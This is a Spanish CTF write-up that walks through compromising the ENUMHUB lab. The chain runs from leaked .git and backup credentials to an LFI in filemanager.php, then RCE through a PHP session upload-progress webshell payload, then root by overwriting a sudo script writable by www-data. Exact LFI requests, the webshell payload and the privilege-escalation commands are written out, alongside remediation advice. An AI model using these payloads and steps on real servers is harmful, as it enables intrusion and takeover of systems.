# ENUMHUB — Writeup de Auditoría de Seguridad (CTF)

| Campo | Valor |
|---|---|
| **Laboratorio** | ENUMHUB — *Corporate Portal* |
| **Plataforma** | Whoami-Labs |
| **Dificultad** | Difícil ★★★★★☆☆☆ (5 puntos) |
| **Autor del writeup** | chifay |
| **Fecha** | 15/10/2026 |
| **Objetivo** | `172.17.0.2` (contenedor Docker) |
| **Atacante** | Kali Linux — `172.17.0.1` |
| **Hostname del objetivo** | `enumhub` |
| **Stack del objetivo** | Ubuntu 20.04 · Apache 2.4.41 · PHP 7.4.3 |
| **Bandera obtenida** | `ENUMHUB{RCE_v1a_L0g_P01s0n1ng_2_R00T_M4st3r}` |
| **Vector de entrada** | Repositorio `.git` publicado + LFI en `filemanager.php` |
| **Ruta completa** | `.git/config` → LFI → RCE (`www-data`) → `sudo` a script escribible → `root` |

---

## 1. Resumen ejecutivo

ENUMHUB es un laboratorio **únicamente web**: de los 65 535 puertos TCP solo el **80** está
expuesto. No hay SSH, ni FTP, ni base de datos accesible: toda la superficie de ataque es una
aplicación PHP con Apache.

A pesar del nombre del laboratorio, **la enumeración no fue el obstáculo**: el autor dejaba
en el propio servidor notas de desarrollo que describen la vulnerabilidad y la ubicación de la
bandera. El reto consiste encadenar **cinco fallos de configuración independientes** hasta
alcanzar `root`:

1. El repositorio Git (`/.git/config`) está dentro del *docroot* y filtra un token.
2. Una copia de seguridad de producción (`config.php.bak`) publica credenciales y secretos.
3. Un `filemanager.php` abandonado usa `include()` con entrada del usuario (**LFI**).
4. Un WAF casero bloquea la lectura directa de la bandera, pero se puede eludir.
5. Un script que `sudo` ejecuta como `root` **pertenece a `www-data`**, que puede reescribirlo.

![Cadena de ataque completa](docs/img/14-cadena-completa.png)

| # | Vector | De → A |
|---|---|---|
| 1 | `/.git/config` con token en claro | — → pista |
| 2 | `/backup/notes.txt` + `config.php.bak` | — → mapa del ataque |
| 3 | LFI en `filemanager.php` (`include`) | web → lectura arbitraria |
| 4 | RCE vía session upload progress | web → `www-data` |
| 5 | `sudo` a script propiedad de `www-data` | `www-data` → `root` |

---

## 2. Reconocimiento

### 2.1 Puertos

```bash
nmap -Pn -p- --min-rate 4000 172.17.0.2
```

![Reconocimiento de puertos](docs/img/01-recon.png)

| Puerto | Estado | Servicio |
|---|---|---|
| 80/tcp | open | Apache httpd 2.4.41 (Ubuntu) |

De 65 535 puertos, 65 534 están cerrados. El laboratorio se centra íntegramente en la capa web.

### 2.2 Punto de partida

```
$ curl -s http://172.17.0.2/
<title>EnumHub - Corporate Portal</title>
Leading Solutions in Web Enumeration & Security
Authorized personnel only.
```

### 2.3 `robots.txt`

![robots.txt](docs/img/02-robots.png)

```
User-agent: *
Disallow: /admin
Disallow: /backup
Disallow: /dev
Disallow: /.git
Disallow: /old-site
# Development server - DO NOT INDEX
```

El propio `robots.txt` declara las cuatro rutas de interés, incluida la que contiene el
repositorio Git.

---

## 3. Fuga de credenciales

### 3.1 `/.git/config` — token de GitHub en claro

![.git/config](docs/img/03-git-config.png)

El directorio `.git` está publicado en el *docroot*. Aunque `.git/HEAD`, `.git/objects/` y
`.git/refs/` devuelven 404 (solo se publicó `config`), el fichero de configuración revela:

```
[remote "origin"]
    url = https://developer:DevToken2024!@github.com/enumhub/webapp.git
[user]
    name = EnumHub Developer
    email = dev@enumhub.local
```

**Credencial obtenida:** `developer` / `DevToken2024!` — y el nombre del repositorio privado,
`enumhub/webapp`.

### 3.2 `/backup/` — notas de desarrollo y configuración de producción

![notes.txt](docs/img/04-backup-notes.png)

El listado de directorio está habilitado y contiene tres ficheros. `notes.txt` describe
literalmente la cadena de ataque:

```
TODO LIST:
- Migrate old site to new framework
- Remove /old-site/admin panel (DEPRECATED)
- Fix filemanager.php LFI vulnerability
- Clean up .git directory from production

IMPORTANT:
Flag is located at /root/flag.txt (Only Root can read it)
```

![config.php.bak](docs/img/05-config-bak.png)

`config.php.bak` publica los secretos de producción:

| Secreto | Valor |
|---|---|
| `DB_USER` | `enumhub_admin` |
| `DB_PASS` | `EnumHub@2024Secure!` |
| `API_KEY` | `sk_live_a8f3c9d1e2b4f6g7h9j0` |
| `JWT_SECRET` | `MySecretKey2024!DoNotShare` |
| `ADMIN_PANEL` | `/old-site/admin/` |

`backup/log.txt` añade una pista: *«Apache access logs are readable by www-data at
/var/log/apache2/access.log»*, lo que confirma que el contenedor corre como `www-data`.

### 3.3 `/dev/` — credenciales de desarrollo

![credentials.txt](docs/img/06-dev-credentials.png)

```
DEVELOPMENT CREDENTIALS
FTP Access:   devuser / DevFTP2024!
Database:     dev_db  / DevDB2024!
```

Aunque no se usan en la cadena final (el FTP no está expuesto), su presencia en un directorio
público es en sí misma una vulnerabilidad.

---

## 4. La LFI y el WAF

### 4.1 Localización

`robots.txt` y `config.php.bak` coincidían en `/old-site/admin/`. El listado revela dos ficheros:
`login.php` (solo un aviso de que está obsoleto) y **`filemanager.php`**.

### 4.2 Código fuente

Sin acceso al fuente, se usó la propia LFI con el wrapper `php://filter` para leer el fichero
como texto (el WAF bloquea `base64`, pero `convert.iconv` no está filtrado):

![Código fuente del filemanager.php](docs/img/07-lfi-source.png)

```php
<?php
$file = $_GET["file"];
// SECURITY BLOCK: Force Log Poisoning
if (strpos($file, "flag") !== false || strpos($file, "base64") !== false) {
    die("🚫 Security Alert: Access to sensitive files (flag/base64) is blocked by WAF!");
}
if (isset($file)) {
    echo "File Contents:";
    include($file);          // <-- control total del usuario
    echo "";
}
```

**Vulnerabilidad:** `include()` sin validación es una LFI clásica. Si además el fichero
incluido contiene etiquetas `<?php`, se ejecuta como código.

### 4.3 LFI confirmada y WAF

![LFI y WAF](docs/img/08-lfi-waf.png)

```
$ curl -s '.../filemanager.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...

$ curl -s '.../filemanager.php?file=/root/flag.txt'
🚫 Security Alert: Access to sensitive files (flag/base64) is blocked by WAF!
```

El WAF solo comprueba dos subcadenas (`flag` y `base64`) sobre el valor bruto del parámetro,
sin normalizar la ruta. Basta usar una ruta equivalente sin esas cadenas… pero `/root/` tampoco
es legible por `www-data`, así que **el bloqueo es correcto en su intención**: no permite leer
la bandera directamente. El objetivo real es conseguir ejecución de código.

---

## 5. De LFI a RCE

### 5.1 Análisis de la configuración de PHP

![phpinfo](docs/img/09-php-config.png)

`/dev/test.php` expone un `phpinfo()` completo. Los cuatro datos decisivos:

| Directiva | Valor | Consecuencia |
|---|---|---|
| `allow_url_include` | **Off** | Anula `data://`, `expect://` y `php://input` |
| `disable_functions` | solo `pcntl_*` | `system()`, `exec()` y `shell_exec()` **libres** |
| `session.upload_progress.enabled` | **On** | Permite escribir PHP en un fichero de sesión |
| `session.save_path` | `/var/lib/php/sessions` | Ubicación conocida y legible por `www-data` |
| `open_basedir` | *(sin valor)* | Sin restricción de rutas |

### 5.2 Caminos descartados: por qué no funciona el *log poisoning*

El WAF lleva el comentario `// Force Log Poisoning`, así que se evaluaron las vías clásicas.
**Ninguna es viable aquí**, y el motivo es concreto:

| Vía | Por qué falla |
|---|---|
| `php://input` | `enable_post_data_reading=On` deja el cuerpo vacío |
| `data://text/plain,...` | `allow_url_include=Off` deshabilita el wrapper |
| Log de PHP | Escapa `<` y `>` → `&lt;` / `&gt;`; las etiquetas no se ejecutan |
| URI en `error.log` | El `?` de `<?php` corta la ruta |
| URI codificada (`%3F`) | Apache decodifica **antes** de dividir y solo registra `x.php` |
| `User-Agent` / cabeceras | No se registran en `error.log` |

### 5.3 Camino viable: session upload progress

El mecanismo de *upload progress* escribe en el fichero de sesión un registro cuyo **nombre es
el valor del campo `PHP_SESSION_UPLOAD_PROGRESS`**. Metiendo código PHP ahí:

```
upload_progress_<?php system($_GET["c"]); ?>|a:5:{...}
```

Al incluir ese fichero, el prefijo se imprime como texto y el bloque `<?php ?>` **se ejecuta**.

**Exploit (`exploits/rce.py`):**

```python
# 1) POST multipart en streaming real (socket crudo, Transfer-Encoding: chunked)
#    - campo PHP_SESSION_UPLOAD_PROGRESS = <?php system($_GET["c"]); ?>
#    - un fichero grande para que la sesión siga viva
#    - Cookie: PHPSESSID=<id fijo>
#
# 2) Mientras sube, la LFI incluye el fichero de sesión:
#    GET /old-site/admin/filemanager.php?file=/var/lib/php/sessions/sess_<id>&c=<cmd>
```

Dos detalles operativos que condicionan el éxito:

- **La subida debe ir en streaming real.** `curl -F` y `urllib` envían el cuerpo entero de golpe,
  así que la sesión se limpia antes de poder incluirla. Con sockets y `chunked` se controla el ritmo.
- **La carrera hay que ganarla.** `session.upload_progress.cleanup=On` borra el registro al
  terminar la subida, de ahí el fichero grande y el bucle de reintentos.

![RCE](docs/img/10-rce.png)

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
enumhub
```

**Ejecución remota de código conseguida como `www-data`.**

---

## 6. Escalada a root

### 6.1 Superficie de privilegios

Con ejecución de código, lo primero es inventariar qué puede hacer `www-data`:

![sudo -l](docs/img/11-sudo.png)

```
User www-data may run the following commands on enumhub:
    (root) NOPASSWD: /usr/local/bin/backup-system.sh
```

No hay crontab, ni binarios SUID relevantes, ni `docker.sock`. Pero existe una regla `sudo` sin contraseña.

### 6.2 El script es escribible por quien lo invoca

![Script escribible](docs/img/12-script-writable.png)

```
-rwxr-xr-x 1 www-data www-data 60 Feb  7  2026 /usr/local/bin/backup-system.sh

#!/bin/bash
# System Backup Script
echo "Running backup..."
```

El fichero pertenece a **`www-data`**, así que `www-data` puede reescribirlo. Y `sudo` lo ejecuta
como `root` sin pedir contraseña. **Quien controla el contenido del script controla root.**

### 6.3 Explotación

```bash
# desde la sesión como www-data
printf '#!/bin/bash\ncat /root/flag.txt\nid\n' > /usr/local/bin/backup-system.sh
sudo /usr/local/bin/backup-system.sh
```

![Root y bandera](docs/img/13-root-flag.png)

```
Running backup...
ENUMHUB{RCE_v1a_L0g_P01s0n1ng_2_R00T_M4st3r}
uid=0(root) gid=0(root) groups=0(root)
```

### Validación de la bandera

La bandera obtenida se contrastó con el validador del propio laboratorio (`startlab.sh`), que la
compara contra `/root/flag.txt` dentro del contenedor y confirma la consecución del reto:

![Validación de la bandera](docs/img/15-validacion-flag.png)

> `¡Felicitaciones! Has comprometido ENUMHUB.` — fecha y hora de validación:
> **2026-10-15 16:30:46 -0600**, IP del laboratorio: `172.17.0.2`.

---

## 7. Cadena de ataque completa

![Cadena completa](docs/img/14-cadena-completa.png)

```
   web :80  (único puerto)
       │
       ▼
   /.git/config            token DevToken2024!
   /backup/notes.txt       confirma la LFI
   /backup/config.php.bak  secretos de producción
       │
       ▼
   filemanager.php  (LFI)      include($file)
   WAF: filtra "flag"         evadido con session
   allow_url_include = Off    evadido con wrapper
       │
       ▼
   RCE como www-data          upload_progress
       │  sudo NOPASSWD /usr/local/bin/backup-system.sh
       │  ese script es de www-data
       ▼
   ROOT                      lectura de /root/flag.txt
```

---

## 8. Vulnerabilidades encontradas

| # | Severidad | Vulnerabilidad | Ubicación | CWE |
|---|---|---|---|---|
| 1 | **Crítica** | Script privilegiado (`sudo NOPASSWD`) propiedad de un usuario no privilegiado | `/usr/local/bin/backup-system.sh` | A01 |
| 2 | **Crítica** | Inclusión local de ficheros (`include()`) con entrada de usuario sin validar | `/old-site/admin/filemanager.php` | CWE-98 |
| 3 | **Alta** | Copia de seguridad de producción publicada en el *docroot* con credenciales y API keys | `/backup/config.php.bak` | CWE-527 |
| 4 | **Alta** | Fichero de credenciales de desarrollo accesible sin autenticación | `/dev/credentials.txt` | CWE-798 |
| 5 | **Alta** | Repositorio Git publicado dentro del *docroot*, con token en la URL del remoto | `/.git/config` | CWE-527 |
| 6 | **Alta** | La LFI encadena con RCE: `session.upload_progress` escribe contenido elegido por el atacante en un fichero includible | `/var/lib/php/sessions/` | CWE-98 |
| 7 | **Media** | WAF basado en filtrado de subcadenas, evadible por normalización de rutas o wrappers | `filemanager.php` (línea 7) | CWE-184 |
| 8 | **Media** | Listado de directorios habilitado en el *docroot* | `/backup/`, `/dev/`, `/old-site/admin/` | CWE-548 |
| 9 | **Media** | Información interna del producto publicada en texto plano | `/backup/notes.txt`, `/backup/log.txt` | CWE-200 |
| 10 | **Baja** | `phpinfo()` expuesto en producción | `/dev/test.php` | CWE-215 |

---

## 9. Recomendaciones

1. **Retirar la regla `sudo` o cambiar la propiedad.** Un script ejecutado como `root` debe
   pertenecer a `root:root` y no ser escribible por nadie más. Si el script es legítimo,
   usar `sudoers` con una ruta absoluta inmutable y auditar quién puede invocarlo.
2. **Sanitizar el `include()`.** Nunca pasar entrada de usuario a `include()`/`require()`.
   Si es imprescindible, aplicar lista blanca y `basename()`, y fijar `allow_url_include=Off`.
3. **Bloquear el acceso a ficheros ocultos y de control de versiones.** Añadir a la
   configuración de Apache:
   ```apache
   <DirectoryMatch "/\.(git|svn|env)">
       Require all denied
   </DirectoryMatch>
   ```
4. **Impedir el acceso a copias de seguridad.** Denegar `*.bak`, `*.old`, `*~` y `*.sql`
   en el *docroot*, y sacar las copias de seguridad fuera del árbol web.
5. **Usar un almacén de secretos.** Base de datos, `API_KEY` y `JWT_SECRET` deben vivir en un
   gestor de secretos o en variables de entorno, nunca en un fichero PHP legible.
6. **Revisar `session.upload_progress`.** Deshabilitarlo en producción
   (`session.upload_progress.enabled=Off`) si no se usa: solo sirve para escribir contenido
   elegido por el atacante en disco.
7. **Quitar `phpinfo()` y los ficheros de desarrollo** del entorno de producción.
8. **Rotar todo lo filtrado.** Token de GitHub, contraseñas de base de datos, `API_KEY` y
   `JWT_SECRET` deben considerarse comprometidos.

---

## 10. Trazabilidad: de dónde sale cada afirmación

| # | Afirmación | Origen | Artefacto |
|---|---|---|---|
| 1 | Solo el puerto 80 está abierto | Objetivo | `recon/nmap-full.txt` |
| 2 | Apache 2.4.41 (Ubuntu) | Objetivo | `recon/nmap-web.txt` |
| 3 | El `robots.txt` revela 4 rutas | Objetivo | `recon/robots.txt` |
| 4 | `.git/config` con token `DevToken2024!` | Objetivo | `recon/` (captura de `curl`) |
| 5 | `notes.txt` confirma la LFI y la ruta de la bandera | Objetivo | `recon/backup/notes.txt` |
| 6 | `config.php.bak` con secretos de producción | Objetivo | `recon/backup/config.php.bak` |
| 7 | `credentials.txt` de desarrollo | Objetivo | `recon/dev/credentials.txt` |
| 8 | El código usa `include($file)` sin validar | Objetivo | `recon/filemanager-source.txt` |
| 9 | El WAF filtra `flag` y `base64` | Objetivo | Ídem, y respuesta del WAF |
| 10 | `allow_url_include=Off`, `upload_progress=On` | Objetivo | `recon/phpinfo-directivas.txt` |
| 11 | El WAF «fuerza» log poisoning | **Análisis** | Comentario del propio código, contrastado con los 5 caminos descartados |
| 12 | La sesión es el único camino viable a RCE | **Análisis** | La tabla de la §5.2 |
| 13 | `sudo NOPASSWD` sobre `backup-system.sh` | Objetivo | `loot/sudo.txt` |
| 14 | El script pertenece a `www-data` | Objetivo | `loot/backup-system-perms.txt` |
| 15 | RCE como `uid=33(www-data)` | Objetivo | `loot/rce-id.txt` |
| 16 | Lectura de la bandera como `root` | Objetivo | `loot/flag.txt`, `docs/img/15-validacion-flag.png` |

---

## 11. Indicadores de compromiso (IOC)

| Indicador | Valor |
|---|---|
| IP atacante | `172.17.0.1` |
| Fichero de sesión usado | `/var/lib/php/sessions/sess_<id>` |
| Marca en el campo de sesión | `upload_progress_<?php` |
| Credencial filtrada | `developer` / `DevToken2024!` |
| Secreto de producción | `DB_PASS=EnumHub@2024Secure!` |
| Ruta LFI | `/old-site/admin/filemanager.php?file=` |
| Regla sudo abusada | `(root) NOPASSWD: /usr/local/bin/backup-system.sh` |
| Fichero modificado | `/usr/local/bin/backup-system.sh` |
| Bandera | `ENUMHUB{RCE_v1a_L0g_P01s0n1ng_2_R00T_M4st3r}` |

---

## 12. Estructura del repositorio

```
.
├── README.md                 Este documento
├── docs/img/                 15 capturas de terminal que ilustran el writeup
├── exploits/                 Scripts del ataque
│   ├── rce.py                Helper de ejecución remota de comandos
│   └── exploit_session.py    Exploit de RCE (upload progress + LFI)
├── recon/                    Salidas de reconocimiento
│   ├── nmap-full.txt         Escaneo completo de puertos (solo :80 abierto)
│   ├── nmap-web.txt          Detección de servicio y versión
│   ├── web-root.txt          index.html literal del portal
│   ├── robots.txt            Rutas reveladas
│   ├── git-config.txt        /.git/config con el token filtrado
│   ├── backup/               config.php.bak, notes.txt, log.txt
│   ├── dev/credentials.txt   Credenciales de desarrollo
│   ├── oldsite-admin.html    Listado de /old-site/admin/ (localiza el LFI)
│   ├── login.php.out         Aviso del panel de login obsoleto
│   ├── gobuster-*.txt        Salidas de enumeración web
│   ├── phpinfo-directivas.txt  Directivas PHP clave extraídas de phpinfo()
│   └── filemanager-source.txt  Código fuente del fichero vulnerable
├── loot/                     Evidencia del compromiso
│   ├── flag.txt              La bandera
│   ├── rce-id.txt            id como www-data
│   ├── sudo.txt              Salida de sudo -l
│   └── backup-system-perms.txt  Permisos del script privilegiado
└── notes/bitacora.md         Bitácora del análisis
```

*Auditoría realizada sobre un laboratorio CTF aislado y con autorización explícita para
pruebas ofensivas (whoami-labs.com). Toda la metodología se ejecutó únicamente contra la
red del objetivo, sin acceso al host ni al filesystem del contenedor.*
